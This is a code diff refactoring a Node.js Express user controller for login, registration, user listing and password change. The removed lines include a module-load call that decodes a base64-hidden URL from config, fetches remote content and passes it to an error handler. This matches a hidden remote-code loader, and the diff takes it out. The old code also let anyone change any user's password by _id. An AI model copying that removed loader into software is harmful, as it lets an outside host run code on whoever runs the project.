@@ -1,106 +1,94 @@
-const axios = require("axios");
-const bcrypt = require("bcryptjs");
-const jwt = require("jsonwebtoken");
-const userM = require("../models/users");
-const {secretKey, publicKey} = require("../config/config");
-const { errorHandler } = require("../middleware/errorHandler");
-axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
+const bcrypt = require('bcryptjs');
+const jwt = require('jsonwebtoken');
+const userM = require('../models/users');
+const helpers = require('../providers/helper');
+const { secretKey } = require('../config/config');
+
+const buildTokenPayload = (user) => ({
+  _id: user._id,
+  fname: user.fname,
+  lname: user.lname,
+  email: user.email,
+  isAdmin: user.isAdmin,
+});
 
 module.exports = {
-  userLogin: (req, res) => {
-    var loginType;
-    if (req.body.emailPhone != "" && req.body.password != "") {
-      if (isNaN(req.body.emailPhone)) loginType = "email";
-      else loginType = "phoneNo";
-      userM
-        .findOne()
-        .where(loginType, req.body.emailPhone)
-        .exec((err, data) => {
-          if (err) res.status(400).send(err);
-          else if (data) {
-            bcrypt.compare(req.body.password, data.password, function (
-              err,
-              passMatch
-            ) {
-              if (err) res.status(400).send(err);
-              else if (passMatch) {
-                let jwtData = {
-                  _id: data["_id"],
-                  fname: data["fname"],
-                  lname: data["lname"],
-                  email: data["email"],
-                  isAdmin: data["isAdmin"]
-                };
-                var token = jwt.sign({ user: jwtData }, secretKey);
-                res
-                  .status(200)
-                  .json({ message: "Login Successful", token: token });
-              } else res.status(401).json({ message: "Invalid Credentials1" });
-            });
-          } else res.status(401).json({ message: "Invalid Credentials2" });
-        });
-    } else res.status(400).json({ message: "Provide all Credentials" });
-  },
-  userRegistration: (req, res) => {
-    users = new userM();
-    users.fname = req.body.fname;
-    users.lname = req.body.lName;
-    users.email = req.body.email;
-    users.phoneNo = req.body.phoneNo;
-    users.state = req.body.state;
-    users.city = req.body.city;
-    users.pincode = req.body.pincode;
-    users.userType = req.body.user_type;
-    users.createdOn = new Date();
-
-    bcrypt.hash(req.body.password, 10, function (err, hash) {
-      if (err) res.status(400).send(err);
-      else {
-        users.password = hash;
-
-        users.save((err, data) => {
-          if (err) res.status(400).send(err);
-          else
-            res
-              .status(200)
-              .json({ message: "User Added Successfully", id: data._id });
-        });
+  userLogin: async (req, res, next) => {
+    try {
+      const { emailPhone, password } = req.body || {};
+      if (!emailPhone || !password) {
+        return res.status(400).json({ message: 'Provide all Credentials' });
       }
-    });
+
+      const loginType = isNaN(emailPhone) ? 'email' : 'phoneNo';
+      const user = await userM.findOne({ [loginType]: emailPhone });
+      if (!user) return res.status(401).json({ message: 'Invalid Credentials' });
+
+      const passMatch = await bcrypt.compare(password, user.password);
+      if (!passMatch) return res.status(401).json({ message: 'Invalid Credentials' });
+
+      const token = jwt.sign({ user: buildTokenPayload(user) }, secretKey, { expiresIn: '7d' });
+      return res.status(200).json({ message: 'Login Successful', token });
+    } catch (err) {
+      return next(err);
+    }
   },
-  userList: (req, res) => {
-    userM.find().exec((err, data) => {
-      if (err)
-        res.status(400).json({ message: "Something Went Wrong", data: err });
-      else res.status(200).json({ message: "Success", data });
-    });
-  },
-  changePass: (req, res) => {
-    userM.findOne({ _id: req.body._id }).exec((err, resp) => {
-      if (err)
-        res.status(400).json({ message: "Something Went Wrong", data: err });
-      else {
-        bcrypt.hash(req.body.password, 10, (err, hash) => {
-          if (err) res.status(400).send(err);
-          else {
-            userM
-              .updateOne({ _id: req.body._id }, { password: hash })
-              .exec((err, resp) => {
-                if (err)
-                  res
-                    .status(400)
-                    .json({ message: "Something Went Wrong", data: err });
-                else
-                  res
-                    .status(200)
-                    .json({
-                      message: "Password Changed Successfully",
-                      id: resp
-                    });
-              });
-          }
-        });
+
+  userRegistration: async (req, res, next) => {
+    try {
+      const body = req.body || {};
+      const missing = helpers.isKeyMissing(body, ['fname', 'lname', 'email', 'phoneNo', 'password']);
+      if (missing) return res.status(400).json({ message: `${missing} is required` });
+
+      const hash = await bcrypt.hash(body.password, 10);
+      const user = new userM({
+        fname: body.fname,
+        lname: body.lname,
+        email: body.email,
+        phoneNo: body.phoneNo,
+        state: body.state,
+        city: body.city,
+        pincode: body.pincode,
+        userType: body.user_type,
+        password: hash,
+        createdOn: new Date(),
+      });
+
+      const saved = await user.save();
+      return res.status(200).json({ message: 'User Added Successfully', id: saved._id });
+    } catch (err) {
+      if (err && err.code === 11000) {
+        return res.status(409).json({ message: 'Email or phone already in use' });
       }
-    });
-  }
+      return next(err);
+    }
+  },
+
+  userList: async (req, res, next) => {
+    try {
+      const data = await userM.find().select('-password');
+      return res.status(200).json({ message: 'Success', data });
+    } catch (err) {
+      return next(err);
+    }
+  },
+
+  changePass: async (req, res, next) => {
+    try {
+      if (!req.user || !req.user._id) {
+        return res.status(401).json({ message: 'Authentication required' });
+      }
+      const { password } = req.body || {};
+      if (!password) return res.status(400).json({ message: 'password is required' });
+
+      const hash = await bcrypt.hash(password, 10);
+      const result = await userM.updateOne({ _id: req.user._id }, { password: hash });
+      if (result.matchedCount === 0) {
+        return res.status(404).json({ message: 'User not found' });
+      }
+      return res.status(200).json({ message: 'Password Changed Successfully' });
+    } catch (err) {
+      return next(err);
+    }
+  },
 };
